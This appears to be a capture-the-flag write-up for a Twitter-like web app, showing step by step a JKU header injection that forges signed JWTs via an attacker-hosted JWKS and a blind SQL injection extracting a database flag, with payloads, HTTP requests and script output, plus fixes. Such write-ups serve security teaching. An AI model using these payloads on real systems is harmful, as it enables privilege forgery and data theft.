<h1 align="center">"Twitter v2" CTF Writeup</h1>

In this Capture the Flag (CTF) challenge hosted by Vinted, participants are presented with a scenario centered around a web application that mimics the functionalities of a Twitter-like platform, aptly named "Twitter v2". As an example the CTF was hosted on  `ctf.redacted.com`. 

Participants are given access to the source code of the application, which is a critical resource for conducting a thorough security analysis and identifying potential vulnerabilities.

The primary objective of this challenge is to retrieve a secret flag stored in the application's database. To achieve this, participants must successfully exploit two key vulnerabilities:

### 1. JKU Injection
This stage involves manipulating the JSON Web Key Set (JKWS) in order to gain unauthorized privileges within the application. In "Twitter v2", only users with an invitation can post messages.

### 2. Blind SQL Injection
After gaining initial access, participants must leverage a blind SQL injection vulnerability to read sensitive data from the database, ultimately leading to the discovery of the secret flag.

As we progress through the challenge, we will dissect each vulnerability, explore the methodologies used for exploitation, and discuss the best practices for remediation.

<h1 align="center">Source Code Analysis</h1>


In the "Twitter v2" CTF challenge, a critical aspect of the attack strategy involves analyzing the source code of the web application. The source code, accessible for download at `ctf.redacted.com/download`, provides valuable insights into the application's inner workings and potential vulnerabilities. An essential feature of this setup is the `build-docker.sh` script, which enables participants to run the application locally. This setup is crucial for testing various exploits in a controlled environment without any external limitations or constraints.

### Analysis of auth.js
The `auth.js` file primarily handles JWT creation and verification. Key observations include:
#### JWT Creation (createJWT function):
- Generates JWTs with `hasInvitation: false` and a random `tweeterID`.
- Uses RS256 algorithm with a private key located at `./jwt/private.key`.
- The JWT header includes a `jku` field pointing to `http://localhost:1337/.well-known/jwks.json`.

```javascript
const createJWT = () => {
    const claims = {
        hasInvitation: false,
        tweeterID: crypto.randomBytes(32).toString('hex')
    };
    return jwt.sign(claims, privateKey, {
        algorithm: 'RS256',
        keyid: "b8bbdf5e-fb0f-4754-a02d-e47219ae007a",
        header: { "jku": 'http://localhost:1337/.well-known/jwks.json' }
    });
}
```
#### JWT Verification (verifyJWT function):
- Decodes the JWT from the cookie without verifying its signature (`jwt.decode`).
- Extracts `kid` and `jku` from the decoded token's header.
- Fetches the JWK from the specified `jku` URL.
- Verifies the JWT signature using the public key obtained from the JWK.

```javascript
const verifyJWT = async (req, res, next) => {
    try {
        if (!req.cookies.token) {
            return send400(res, 'Missing JWT token');
        }

        // Let's see if the user is authenticated
        let decodedToken = jwt.decode(req.cookies.token, {complete: true});
        if (!decodedToken) {
            return send400(res, 'Malformed JWT token');
        }
        const {kid, jku} = decodedToken.header;
        if (!kid) {
            return send400(res, 'JWT Header is missing kid entry');
        }
        if (!jku) {
            return send400(res, 'JWT Header is missing jku entry');
        }

        const resp = await axios.get(jku);

        if (!resp.data.keys) {
            return send400(res, 'Invalid JWKs - \'keys\' JSON array is missing');
        }

        const publicKey = resp.data.keys.find((key) => key.kid === kid);

        if (!publicKey) {
            return send400(res, 'No public key was found with a given kid');
        }

        decodedToken = jwt.verify(req.cookies.token, jwktopem(publicKey), {algorithm: 'RS256'});

        req.tweeterID = decodedToken.tweeterID;
        req.hasInvitation = decodedToken.hasInvitation;
        next();
    } catch (error) {
        if (error instanceof jwt.JsonWebTokenError) {
            return send400(res, 'Invalid JWT signature');
        }

        return res.status(500).json({success: false, data: 'Unable to fetch JKU'});
    }
}
```
### Analysis of database.js
The `database.js` file manages database interactions. Key observations include:
#### Database Setup (setupDatabase function):
- Creates `tweets` and `secrets` tables.
- Inserts a test flag into the `secrets` table.

```javascript
const setupDatabase = async() => {
    appDatabase = await sqlite.open(path.join(__dirname, 'ctf-challenge.db'));
    await appDatabase.exec(`
        DROP TABLE IF EXISTS tweets;

        CREATE TABLE IF NOT EXISTS tweets (
            tweetID         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
            tweeterID       VARCHAR(255) NOT NULL,
            tweet           TEXT NOT NULL
        );
    
        DROP TABLE IF EXISTS secrets;
        CREATE TABLE IF NOT EXISTS secrets (
            id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
            flag       VARCHAR(255) NOT NULL UNIQUE
        );
        INSERT INTO secrets (flag) VALUES ('CTF{f4k3_fl4g_f0r_t3st1ng!}');
    `);
}
```
### Exploitation Strategy

The exploitation strategy to retrieve the secret flag involves two primary steps, as deduced from the source code analysis:

#### Exploiting JWT Verification Misconfiguration (JKU Header Injection)

The first part of the strategy involves exploiting a misconfigured JWT verification process:

- **Identifying JWT Misconfiguration**: The source code likely contains flaws in how JWTs are verified, particularly concerning the handling of the JKU (JSON Web Key URL).
- **Arbitrary JKU Injection**: The attacker can exploit this by injecting a custom JKU into the JWT header, directing it to an attacker-controlled server.
- **Using Custom Private Key for JWT Signing**: This setup allows the use of a private key chosen by the attacker to sign the JWT, which the application will accept as valid.
- **Bypassing Invitation Restriction**: The attacker can generate JWTs with elevated privileges, bypassing restrictions like the invitation-only message posting.

#### Executing SQL Injection (Blind SQLi)

After gaining elevated privileges, the attacker needs to:

- **Find a Working SQL Payload**: The next step involves identifying a successful SQL payload that can be used to extract sensitive information from the database.

<h1 align="center">Exploiting JKU Header Injection</h1>


The JKU (JSON Web Key URL) Header Injection vulnerability arises when a web application that uses JSON Web Tokens (JWT) for authentication and authorization fails to properly verify the origin and integrity of the cryptographic keys used for signing the tokens. In such a scenario, an attacker can inject a malicious JKU in the JWT header, pointing to a key under their control, thereby compromising the token's security.

In "Twitter v2", the JWT verification process is vulnerable as it trusts the `jku` field in the JWT header without proper validation. The application fetches the JWK from the URL specified in the `jku` field and uses it to verify the JWT signature. An attacker can exploit this by crafting a JWT with a `jku` field pointing to a malicious server hosting a JWK corresponding to a key they own. This allows them to generate valid JWTs with elevated privileges, bypassing application-level restrictions such as the invitation-only constraint for posting messages.

### Proof of Concept

The following steps can be taken to reproduce the successful JKU header injection:

1. **Analyze the initial JWT token**:
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImI4YmJkZjVlLWZiMGYtNDc1NC1hMDJkLWU0NzIxOWFlMDA3YSIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6MTMzNy8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJoYXNJbnZpdGF0aW9uIjpmYWxzZSwidHdlZXRlcklEIjoiYzA0OTViMzM0M2QwNWRkY2FjYmRiOTA1NzYyZDkzODNkZWZiYjYwNjBkNWY4NzA1YWMxODc2ZGY2NDc3MzQyZSIsImlhdCI6MTcwNDIwODM5N30.CgipHJFkz-zfJZcQv2J-4donSNiXcpAxqMKUNwzRLx-6N3sjj86MRo-5jb0eY9Tcal2qM6xi0g-R5KyPwyN2_xhA2Wtk2oEc4gBkTAR34mltwTS73tH50uz9PjAJvvqYLnsTGQVimNRYdIjjO9vt0mPzqUQ5IA5joTg_LiJ9OZEXVh7_LpQAAWWsVZCCHRj0ZiV63VEAgo0J5H6ORPCuXQGiDSRdoQYoiMDTsAYg5gNgWBi8AWv-yHpKQZj_qROVWXdHHmvu34x8qRZaQzu6sH5zD1pj9e0a7PzZm5LH49vc48f4cZXLd0NUQ0axMBTfmvSVIKhR7O0b3X-ntYyt0w
```

2. **Use a JWT decoding tool to decode the initial JWT token issued by the application. Focus on understanding the structure of the JWT, specifically the header and payload**:

-**Header**: observe the JSON Web Key URL (jku).
```json
  {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "b8bbdf5e-fb0f-4754-a02d-e47219ae007a",
    "jku": "http://localhost:1337/.well-known/jwks.json"
  }
```

-**Payload**: identify key-value pairs, particularly those related to user privileges such as `hasInvitation`.
```json
  {
    "hasInvitation": false,
    "tweeterID": "c0495b3343d05ddcacbdb905762d9383defbb6060d5f8705ac1876df6477342e",
    "iat": 1704208397
  }
```
3. **Use a cryptographic tool to generate a new public-private key pair. This key pair will be used to sign the manipulated JWT**:
```bash
   openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048 && openssl rsa -pubout -in private_key.pem -out public_key.pem
```
The output should look something like this:
```
.............+........+....+...........+...+.+..............+......+.+..+....
[...]
..+.+.....+....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
writing RSA key
```
4. **Create a jwks.json file containing the public key from the key pair generated in the previous step**.

   The following Python script can be used to generate a jwks.json file from a public key:

```python
   from jwcrypto import jwk
   import json

   def create_jwks_from_public_key(public_key_file, jwks_file):
       # Load the public key
       with open(public_key_file, "rb") as file:
           public_key_data = file.read()

       # Create a JWK object from the public key
       key = jwk.JWK.from_pem(public_key_data)

       # Create a JWKS containing the JWK
       jwks = json.dumps({"keys": [json.loads(key.export())]})

       # Save the JWKS to a file
       with open(jwks_file, "w") as file:
           file.write(jwks)

       print(f"JWKS saved to {jwks_file}")

   # Replace 'public_key.pem' with your public key file
   public_key_file = 'public_key.pem'
   jwks_file = 'jwks.json'

   create_jwks_from_public_key(public_key_file, jwks_file)
```
This script will generate a jwks.json file that contains the JWK derived from your public key.
```
> pip install jwcrypto
> python jwks.py
JWKS saved to jwks.json
> type jwks.json
{
    "keys": [{
        "kty": "RSA",
        "e": "AQAB",
        "kid": "b8bbdf5e-fb0f-4754-a02d-e47219ae007a",
        "n": "4KO1FIc-rgxdkVgvmgPgB1ctZPTTmRn5KsvGne3DZz8beCdkSjir2XhkjVpy5XuYO40SJkghQmziAD9UjPkjqKOmr0VMJJOcGZy1vMU3pxGMY4TuJN5nQImTBtvNoHxhZ4J5C2lD3alIfXcGcni3xVomnbrkigNs-93sLJu0jGUYGg2plQBg8y5i9PZn6ML0JHd-x-75aBAPzM_Pq0cbFi0qjISYfpUrHTsfxSnB9RA2t6GdY43tHg5Sz-iVKNeTmYGm9UHXBG2T5yV86SrZ3EBvPGvukIxZxqUExTDXb0tbgrl15nHa3J5Sm3XfruwZ_GTCmwKSKPrQq1sZdlmSiQ"
    }]
}
```
5. **Host the `jwks.json` file somewhere where it could be reached by the vulnerable system, e.g., GitHub**:

   This GitHub repo will simulate the attacker-controlled JWKS endpoint:
```
https://raw.githubusercontent.com/vycioha/jwks/main/jwks.json
```
6. **Modify the JWT Header**: Change the `jku` field in the JWT header to the URL where the malicious `jwks.json` is hosted.

```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "kid": "b8bbdf5e-fb0f-4754-a02d-e47219ae007a",
     "jku": "https://raw.githubusercontent.com/vycioha/jwks/main/jwks.json"
   }
```
7. **Modify the JWT Payload**: Adjust the payload to grant the desired privileges, by setting the `hasInvitation` parameter to `true`.

```json
   {
     "hasInvitation": true,
     "tweeterID": "c0495b3343d05ddcacbdb905762d9383defbb6060d5f8705ac1876df6477342e",
     "iat": 1704208397
   }
```
8. **Use the public and private keys to sign and verify the modified JWT token**:

<p align="center">
  <img src="https://github.com/vycioha/Twitter-v2_CTF-Challenge_WriteUp/assets/44521393/600ecaff-1fbf-44d0-9f86-7578f047e04b" alt="image">
</p>


9. **Use the application's functionality to post a message**. Include the newly created JWT in the request's cookie header.
### HTTP POST request:
```http
POST /api/v1/tweets HTTP/1.1
Host: 127.0.0.1:1337
Content-Type: application/json
Content-Length: 26
Cookie: token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92eWNpb2hhL2p3a3MvbWFpbi9qd2tzLmpzb24iLCJraWQiOiJiOGJiZGY1ZS1mYjBmLTQ3NTQtYTAyZC1lNDcyMTlhZTAwN2EiLCJ0eXAiOiJKV1QifQ.eyJoYXNJbnZpdGF0aW9uIjp0cnVlLCJ0d2VldGVySUQiOiI4MmE5NTQzZWU0Nzc1YzA4MzgxODZjMTMzMzIzYjM3YWIwMDA1OWM2ODFhZWVjMjczMzlmMmI1MzA5YTQ5MjdjIn0.KqDnoxJJkQb2HhZmO5cLhLRRf6TPQuMd7wyxGSwlqTgo3xzwvP0B9robs-kZJR8fbDu3K-cii0ypt8bwadIMBMUnC3B11UnjisTz68_Z1yr5tOdB0G2FiwX-Ufz5Q_oOPiIB9_XdoWDME1XiZWhq8i_iLUxbP1PHppwjubcMtuFj8WTA5N6D60YTDOJTaX_D5PXvXkjMwi4ebNvv8_PIqQyq_tbFIi02lTV3hTxRfryCU6DaWWuAFUvIxgizv_XU-Udd9nut-PsvjWGvwpE3tFAiChuD0hMzEkgJq6nbNW4LGXTlbFCkl4hEWSJh0wzi4fbwR-wzAxvQtyAjeFV6ow

   {
       "tweet": "great success!"
   }
```
The application now accepts this JWT as valid and allows actions that require invitation rights.
### HTTP Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 144
ETag: W/"90-K6vFtiPVb1Wcoi7/KljDm9AkgXg"
Connection: keep-alive

{
    "success": true,
    "data": {
        "tweetID": 6535,
        "tweeterID": "82a9543ee4775c0838186c133323b37ab00059c681aeec27339f2b5309a4927c",
        "tweet": "great success!"
    }
}
```
### Recommended Solution

To address the vulnerability, the following changes should be made:

### Switch to a Predefined Set of Trusted JWKs
Rather than relying on dynamically fetching the JWKs from URLs specified in JWTs, the application should use a predefined set of known and trusted JWKs. These JWKs can be securely stored either locally within the application's infrastructure or on a trusted, secure server. This approach ensures that the application only uses cryptographic keys that have been previously vetted and deemed secure.

### Implement a Whitelist for JKU URLs
Establish a whitelist of approved URLs that are permitted to host JWK files, as referenced in the JWT's `jku` header parameter. This whitelist should be stringently maintained to ensure only trusted sources are used. When implementing this whitelist:
- **Validate the Entire URL and Path**: It's crucial to validate not just the domain but the entire URL and the path to prevent any manipulation or bypasses of the validation process.
- **Disable HTTP Redirections**: Modify the HTTP client library responsible for fetching the token to disable HTTP redirections. This prevents attackers from circumventing the whitelist by using redirections to untrusted JWK sources.

These modifications will enhance the security of the JWT processing mechanism, ensuring that only JWTs with a `jku` pointing to a trusted and verified source are accepted. This approach effectively mitigates the risk of JKU header injection.

<h1 align="center">Exploiting Blind SQL Injection</h1>
Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response. This attack is used to steal information from the database by observing the behavior of the server.

In the “Twitter v2” application, the Blind SQL Injection vulnerability exists in the `insertTweet` function within the `database.js` file. The application fails to properly sanitize user input before incorporating it into SQL queries. This oversight allows an attacker to craft and inject SQL statements that the database will execute. Since the application does not provide direct feedback on the SQL operation's result, the attacker would use a blind SQL injection technique to infer information from the database based on the application's behavior or HTTP responses.

### Proof of Concept

The following steps can be taken to reproduce a successful SQL injection:

1. **Confirm Vulnerability to SQL Injection**:
   Determine the specific input field or parameter in the application that interfaces with the SQL database. For “Twitter v2”, this field is a “tweet” parameter field in the HTTP POST `/api/v1/tweets` endpoint.

To confirm the injection point, the following HTTP POST request with a blind SQL injection payload can be sent:
```http
POST /api/v1/tweets HTTP/1.1
Host: 127.0.0.1:1337
Content-Type: application/json
Content-Length: 23
Cookie: token=[REDACTED]

{
"tweet":"' OR '1'='1"
}
```

The `' OR '1'='1` payload is a logical statement that always evaluates to true. In SQL, `'1'='1'` is a comparison operation that compares two identical strings (“1”), resulting in a true condition.
When the attacker uses the payload as the tweet input, the final SQL query looks like this:
```sql
INSERT INTO tweets (tweeterID, tweet) VALUES (?, '' OR '1'='1')
```

By analyzing the HTTP response we can confirm that the injection was successful, and the value of the tweet was returned as a Boolean true (“1”):
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 131
ETag: W/"83-zE74dcEVPSJIUs8TfUdHttUPKCI"
Connection: keep-alive

{
  "success":true,
  "data":{
    "tweetID":6536,
    "tweeterID":"82a9543ee4775c0838186c133323b37ab00059c681aeec27339f2b5309a4927c",
    "tweet":"1"
  }
}
```
2. **Generate a Payload for Confirming Known Value of Secret Flag**:
   Create a SQL payload that asks a true/false question about the flag. For example, to check if the first character of the flag is “C”, the following payload can be used:
```sql
' OR (CASE WHEN (SELECT SUBSTR(flag, 1, 1) FROM secrets LIMIT 1) = 'C' THEN '1' ELSE '2' END) = '1
```
- `SELECT SUBSTR(flag, 1, 1) FROM secrets LIMIT 1`:
  This part of the payload fetches the first character of the flag column from the first row in the secrets table.
- `CASE WHEN ... THEN '1' ELSE '2' END`:
  This is a conditional statement that evaluates whether the first character of the flag is “C”. If the condition is true (the first character is indeed “C”), it returns “1”. Otherwise, it returns “2”.
- `' OR (...) = '1`:
  This is the outer logical expression that incorporates the CASE statement. If the CASE statement returns '1', the entire condition ' OR '1' = '1' becomes true. If the CASE statement returns '2', the condition becomes ' OR '2' = '1', which is false.

When attacker uses the payload as the tweet input, the final SQL query looks like this:
```sql
INSERT INTO tweets (tweeterID, tweet) VALUES (?, '' OR (CASE WHEN (SELECT SUBSTR(flag, 1, 1) FROM secrets LIMIT 1) = 'C' THEN '1' ELSE '2' END) = '1)
```
To confirm that the first character of the flag string in first column/row of a secrets table is “C” we can send the following HTTP POST request:
```http
POST /api/v1/tweets HTTP/1.1
Host: 127.0.0.1:1337
Content-Type: application/json
Content-Length: 110
Cookie: token=[REDACTED]

{
"tweet":"' OR (CASE WHEN (SELECT SUBSTR(flag, 1, 1) FROM secrets LIMIT 1) = 'C' THEN '1' ELSE '2' END) = '1"
}

```
The HTTP response returns a true (“1”) which confirms that it is actually “C”:
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 131
Connection: keep-alive

{
  "success":true,
  "data":{
    "tweetID":6537,
    "tweeterID":"82a9543ee4775c0838186c133323b37ab00059c681aeec27339f2b5309a4927c",
    "tweet":"1"
    }
}
```

3. **Automate the Process**:
   To automate the process of secret flag retrieval, a custom Python script was used (see CTF_Script.py). The script performs both JKU header injection and Blind SQL injection to find the value of the flag:

```
Trying to exploit JKU injection.
jku set to 'https://raw.githubusercontent.com/vycioha/jwks/main/jwks.json'

Creating JWT...
JWT created successfully.
JWT Value: [REDACTED]

Making a HTTP POST request to http://127.0.0.1:1337/api/v1/tweets for JKU Injection...
HTTP POST Request:
┌────────────────────────────────────────────────────────────────────────────────────────────────
│ POST http://127.0.0.1:1337/api/v1/tweets                                                                                 
│ Headers: {                                                                                                               
│   "Accept": "application/json, text/plain, */*",                                                                         
│   "Content-Type": "application/json",                                                                                    
│   "Cookie": "token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmN... 
│ }                                                                                                                        
│ Data: {                                                                                                                  
│   "tweet": "hello"                                                                                                       
│ }                                                                                                                        
└────────────────────────────────────────────────────────────────────────────────────────────────
HTTP Response:
┌────────────────────────────────────────────────────────────────────────────────────────────────
│ Response Status Code: 200                                                                                                
│ Headers: {                                                                                                               
│   "Content-Type": "application/json; charset=utf-8",                                                                     
│   "Content-Length": "135",                                                                                               
│   "ETag": "W/\"87-/0S/Sin25lr5wKQYxjt09uNTydc\"",                                                                        
│   "Connection": "keep-alive"                                                                                             
│ }                                                                                                                        
│ Body:                                                                                                                    
│ {"success":true,"data":{"tweetID":6538,"tweeterID":"82a9543ee4775c0838186c133323b37ab000…
└────────────────────────────────────────────────────────────────────────────────────────────────
HTTP response indicates that the JKU injection was successful.

Starting flag retrieval - SQL Injection...
on 35: Current flag: C
Searching #1 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▋⚠                        | (!) 35/95 [37%] in 4.5s (7.63/s) 
on 52: Current flag: CT
Searching #2 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▊⚠                 | (!) 52/95 [55%] in 6.5s (7.90/s) 
on 38: Current flag: CTF
Searching #3 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉⚠                       | (!) 38/95 [40%] in 4.8s (7.89/s) 
on 91: Current flag: CTF{
Searching #4 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▎⚠| (!) 91/95 [96%] in 11.3s (7.99/s) 
on 70: Current flag: CTF{f
Searching #5 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▍⚠         | (!) 70/95 [74%] in 8.9s (7.86/s) 
on 20: Current flag: CTF{f4
Searching #6 |▉▉▉▉▉▉▉▉▍⚠                              | (!) 20/95 [21%] in 2.7s (7.07/s) 
on 75: Current flag: CTF{f4k
Searching #7 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▌⚠       | (!) 75/95 [79%] in 9.5s (7.82/s) 
on 19: Current flag: CTF{f4k3
Searching #8 |▉▉▉▉▉▉▉▉⚠                               | (!) 19/95 [20%] in 2.5s (7.44/s) 
on 63: Current flag: CTF{f4k3_
Searching #9 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▌⚠            | (!) 63/95 [66%] in 8.0s (7.85/s) 
on 70: Current flag: CTF{f4k3_f
Searching #10 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▍⚠         | (!) 70/95 [74%] in 8.8s (7.86/s) 
on 76: Current flag: CTF{f4k3_fl
Searching #11 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉⚠       | (!) 76/95 [80%] in 9.8s (7.71/s) 
on 20: Current flag: CTF{f4k3_fl4
Searching #12 |▉▉▉▉▉▉▉▉▍⚠                              | (!) 20/95 [21%] in 2.6s (7.54/s) 
on 71: Current flag: CTF{f4k3_fl4g
Searching #13 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▊⚠         | (!) 71/95 [75%] in 9.2s (7.65/s) 
on 63: Current flag: CTF{f4k3_fl4g_
Searching #14 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▌⚠            | (!) 63/95 [66%] in 8.1s (7.77/s) 
on 70: Current flag: CTF{f4k3_fl4g_f
Searching #15 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▍⚠         | (!) 70/95 [74%] in 9.3s (7.50/s) 
on 16: Current flag: CTF{f4k3_fl4g_f0
Searching #16 |▉▉▉▉▉▉▋⚠                                | (!) 16/95 [17%] in 2.0s (7.73/s) 
on 82: Current flag: CTF{f4k3_fl4g_f0r
Searching #17 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▌⚠    | (!) 82/95 [86%] in 10.8s (7.52/s) 
on 63: Current flag: CTF{f4k3_fl4g_f0r_
Searching #18 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▌⚠            | (!) 63/95 [66%] in 8.2s (7.65/s) 
on 84: Current flag: CTF{f4k3_fl4g_f0r_t
Searching #19 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▍⚠   | (!) 84/95 [88%] in 11.2s (7.48/s) 
on 19: Current flag: CTF{f4k3_fl4g_f0r_t3
Searching #20 |▉▉▉▉▉▉▉▉⚠                               | (!) 19/95 [20%] in 2.5s (7.29/s) 
on 83: Current flag: CTF{f4k3_fl4g_f0r_t3s
Searching #21 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉⚠    | (!) 83/95 [87%] in 10.8s (7.67/s) 
on 84: Current flag: CTF{f4k3_fl4g_f0r_t3st
Searching #22 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▍⚠   | (!) 84/95 [88%] in 10.8s (7.76/s) 
on 17: Current flag: CTF{f4k3_fl4g_f0r_t3st1
Searching #23 |▉▉▉▉▉▉▉▏⚠                               | (!) 17/95 [18%] in 2.2s (7.70/s) 
on 78: Current flag: CTF{f4k3_fl4g_f0r_t3st1n
Searching #24 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▊⚠      | (!) 78/95 [82%] in 9.8s (7.96/s) 
on 71: Current flag: CTF{f4k3_fl4g_f0r_t3st1ng
Searching #25 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▊⚠         | (!) 71/95 [75%] in 9.9s (7.10/s) 
on 2: Current flag: CTF{f4k3_fl4g_f0r_t3st1ng!
Searching #26 |▊⚠                                      | (!) 2/95 [2%] in 0.3s (5.75/s) 
on 93: Current flag: CTF{f4k3_fl4g_f0r_t3st1ng!}
Searching #27 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▏⚠ (!) 93/95 [98%] in 12.0s (7.75/s) 
on 94: 
        '}' Character was found assuming the end of the flag.
Searching #28 |▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▌⚠ (!) 94/95 [99%] in 12.4s (7.53/s) 

Retrieved flag for SQL Injection: CTF{f4k3_fl4g_f0r_t3st1ng!}
```

Running the same script on an actual “Twitter v2” application it gives the following results:
```
[…]
Retrieved flag for SQL Injection: CTF{Visit /77856ad6e2b2271558945ff235c64ed56a62e589 endpoint}
```
Visiting the `https://ctf.redacted.com/77856ad6e2b2271558945ff235c64ed56a62e589` URL returns the following HTTP response:
```http
HTTP/1.1 200 OK
Server: nginx/1.22.1
[…]

             /$$    /$$ /$$             /$$                     /$$
            | $$   | $$|__/            | $$                    | $$
            | $$   | $$ /$$ /$$$$$$$  /$$$$$$    /$$$$$$   /$$$$$$$
            |  $$ / $$/| $$| $$__  $$|_  $$_/   /$$__  $$ /$$__  $$
             \  $$ $$/ | $$| $$  \ $$  | $$    | $$$$$$$$| $$  | $$
              \  $$$/  | $$| $$  | $$  | $$ /$$| $$_____/| $$  | $$
               \  $/   | $$| $$  | $$  |  $$$$/|  $$$$$$$|  $$$$$$$
                \_/    |__/|__/  |__/   \___/   \_______/ \_______/

Good work! You have completed the challenge!
```

### Recommended Solution

To mitigate the SQL injection issue in the provided `insertTweet` function, the existing method of constructing SQL queries should be replaced with a safer approach using prepared statements:
```javascript
    // Using a prepared statement with parameters
      let prepared = await appDatabase.prepare('INSERT INTO tweets (tweeterID, tweet) VALUES (?, ?)');
      await prepared.run(tweeterID, tweet);
```
**Key Changes:**

- **Prepared Statement**:
  The `INSERT INTO tweets` query now uses `?` placeholders for both `tweeterID` and `tweet`, rather than embedding the `tweet` variable directly in the SQL string.
- **Parameter Binding**:
  The `prepared.run` method is called with both `tweeterID` and `tweet` as parameters. This ensures that these values are properly escaped, and the SQL engine treats them as data, not as part of the SQL command.


